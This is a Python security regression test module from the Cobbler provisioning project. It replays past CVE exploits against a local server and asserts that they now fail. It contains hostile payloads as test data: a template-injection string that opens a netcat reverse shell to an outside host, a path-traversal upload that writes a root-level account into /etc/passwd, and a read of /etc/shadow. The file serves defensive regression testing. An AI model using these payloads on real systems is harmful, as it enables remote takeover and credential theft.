"""
This test module tries to automatically replicate all security incidents we had in the past and checks if they fail.
"""

# SPDX-License-Identifier: GPL-2.0-or-later
import base64
import os
import subprocess
import xmlrpc.client
from typing import Any, Callable

import pytest

from cobbler.api import CobblerAPI
from cobbler.modules.authentication import pam
from cobbler.utils import get_shared_secret

try:
    # pylint: disable-next=deprecated-module
    import crypt
except ModuleNotFoundError:
    import legacycrypt as crypt  # type: ignore

# ==================== Start tnpconsultants ====================

# SPDX-FileCopyrightText: 2021 Nicolas Chatelain <nicolas.chatelain@tnpconsultants.com>


@pytest.fixture(name="try_connect")
def fixture_try_connect() -> Callable[[str], xmlrpc.client.ServerProxy]:
    """
    Fixture to provide an XML-RPC Client object to all tests of GHSA-m26c-fcgh-cp6h/CVE-2024-47533.
    """

    def try_connect(url: str) -> xmlrpc.client.ServerProxy:
        xmlrpc_server = xmlrpc.client.ServerProxy(url)
        return xmlrpc_server

    return try_connect


@pytest.fixture(autouse=True)
def setup_profile(
    try_connect: Callable[[str], xmlrpc.client.ServerProxy],
    create_kernel_initrd: Callable[[str, str], str],
    fk_kernel: str,
    fk_initrd: str,
):
    """
    Fixture to provide a distro and profile to all tests of GHSA-m26c-fcgh-cp6h/CVE-2024-47533.
    """
    cobbler_api = try_connect("http://localhost/cobbler_api")
    shared_secret = get_shared_secret()
    token = cobbler_api.login("", shared_secret)
    folder = create_kernel_initrd(fk_kernel, fk_initrd)
    kernel_path = os.path.join(folder, fk_kernel)
    initrd_path = os.path.join(folder, fk_kernel)
    # Create a test Distro
    distro = cobbler_api.new_distro(token)
    cobbler_api.modify_distro(distro, "name", "security_test_distro", token)
    cobbler_api.modify_distro(distro, "arch", "x86_64", token)
    cobbler_api.modify_distro(distro, "kernel", str(kernel_path), token)
    cobbler_api.modify_distro(distro, "initrd", str(initrd_path), token)
    cobbler_api.save_distro(distro, token)
    # Create a test Profile
    profile = cobbler_api.new_profile(token)
    cobbler_api.modify_profile(profile, "name", "security_test_profile", token)
    cobbler_api.modify_profile(profile, "distro", distro, token)
    cobbler_api.save_profile(profile, token)
    return


def test_arbitrary_file_disclosure_1(
    setup_profile: Any, try_connect: Callable[[str], xmlrpc.client.ServerProxy]
):
    """
    Test to verify that the arbitrary file read of GHSA-m26c-fcgh-cp6h/CVE-2024-47533 stays fixed.
    """
    # Arrange
    cobbler_api = try_connect("http://localhost/cobbler_api")

    # Act
    profiles = cobbler_api.get_profiles()
    target: str = profiles[0]["name"]  # type: ignore
    try:
        result: str = cobbler_api.generate_script(target, "", "/etc/shadow")  # type: ignore

        # Assert this NOT succeeds
        assert not result.startswith("root")  # type: ignore
    except xmlrpc.client.Fault as e:
        # We have no way of exactly knowing what is in there but if its a ValueError we most likely caught the exploit
        # before something happened.
        assert "ValueError" in e.faultString


def test_template_injection_1(
    setup_profile: Any, try_connect: Callable[[str], xmlrpc.client.ServerProxy]
):
    """
    Test to verify that the arbitrary template injections of GHSA-m26c-fcgh-cp6h/CVE-2024-47533 stays fixed.
    """
    # Arrange
    exploitcode = "__import__('os').system('nc [tnpitsecurity] 4242 -e /bin/sh')"
    cobbler_api = try_connect("http://localhost/cobbler_api")

    # Act
    profiles = cobbler_api.get_profiles()
    target: str = profiles[0]["name"]  # type: ignore
    try:
        print("[+] Stage 1 : Poisoning log with Cheetah template RCE")
        result_stage_1: str = cobbler_api.generate_script(
            target, "", "{<%= " + exploitcode + " %>}"  # type: ignore
        )
        print("[+] Stage 2 : Rendering template using an arbitrary file read.")
        result_stage_2: str = cobbler_api.generate_script(  # type: ignore
            target, "", "/var/log/cobbler/cobbler.log"  # type: ignore
        )

        # Assert this NOT succeeds
        assert not result_stage_1.startswith("__import__")
        # We should never get to stage two
    except xmlrpc.client.Fault as e:
        # We have no way of exactly knowing what is in there but if its a ValueError we most likely caught the exploit
        # before something happened.
        assert "ValueError" in e.faultString


def test_arbitrary_file_write_1(
    setup_profile: Any, try_connect: Callable[[str], xmlrpc.client.ServerProxy]
):
    """
    Test to verify that the arbitrary file write of GHSA-m26c-fcgh-cp6h/CVE-2024-47533 stays fixed.
    """
    # Arrange
    cobbler_api = try_connect("http://localhost/cobbler_api")
    exploit = b"cha:!:0:0:cha:/:/bin/bash\n"

    # Act
    result = cobbler_api.upload_log_data(
        "../../../../../../etc",
        "passwd",
        len(exploit),
        100000,
        base64.b64encode(exploit),
    )

    # Assert this NOT succeeds
    assert result is False


# ==================== END tnpconsultants ====================

# ==================== START ysf ====================

# SPDX-FileCopyrightText: 2022 ysf <nicolas.chatelain@tnpconsultants.com>


def test_pam_login_with_expired_user():
    """
    Test to verify that GHSA-mcg6-h362-cmq5/CVE-2022-0860 stays fixed.
    """
    # Arrange
    test_api = CobblerAPI()
    test_username = "expired_user"
    test_password = "password"
    # create pam testuser
    subprocess.run(
        ["useradd", "-p", crypt.crypt(test_password), test_username], check=False  # type: ignore
    )
    # change user to be expired
    subprocess.run(["chage", "-E0", test_username], check=False)

    # Act - Try login
    result = pam.authenticate(test_api, test_username, test_password)

    # Assert - Login failed
    assert not result


# ==================== END ysf ====================
